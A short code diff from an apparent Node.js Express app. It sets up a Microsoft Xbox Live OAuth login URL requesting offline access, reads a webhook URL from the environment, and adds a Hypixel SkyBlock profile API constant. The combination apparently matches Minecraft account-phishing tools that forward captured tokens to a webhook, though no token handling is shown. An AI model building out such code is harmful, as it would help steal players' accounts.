@@ -4,7 +4,7 @@ const client_id = process.env.client_id
 const redirect_uri = process.env.redirect_uri
 const webhook_url = process.env.webhook_url
 
-//Requirements
+const API_URL = "https://sky.shiiyu.moe/api/v2/profile/";
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
 const axios = require('axios')
 const express = require('express')
